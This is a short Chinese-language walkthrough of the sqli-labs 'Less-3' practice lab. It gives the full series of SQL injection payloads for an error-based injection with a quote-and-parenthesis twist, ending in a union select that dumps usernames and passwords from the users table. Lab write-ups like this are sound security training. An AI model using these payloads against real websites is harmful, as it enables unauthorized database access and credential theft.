# Less-3 Error  based - Single quotes with twist - String

加一个单引号，报错

?id=1'

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602836345858-b0e3f5c5-b80d-4595-bcc5-b62ed60223bf.png)

根据报错信息修正语句，正常显示

?id=1') --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602836413248-940b10c6-a9cd-4c07-bd41-829454af4fd1.png)

利用order by猜测字段数，从1开始，最后4报错，字段数为3

?id=1') order by 4 --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602836482997-65149c48-2f33-4c3f-a06a-6f6cd09b24b7.png)

利用union select回显，查看回显位置

?id=-1') union select 1,2,3 --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602836618469-86bdefc7-c716-4c22-837a-283e7b3aaac4.png)

获取当前数据库的表名

?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602836741953-9555f5c2-6cd2-4294-b712-71680a0f59cd.png)

可疑的应该是users表，获取指定表的字段名

?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database() --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602836938786-34f9e7af-93cb-435b-bc9c-ff4b0dda4e8b.png)

根据已经获取的表名users和字段名获取内容

?id=-1') union select 1,2,group_concat(username,' ',password) from users --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602837415282-0759267b-9d1d-43e5-9c56-4981ca6a6d79.png)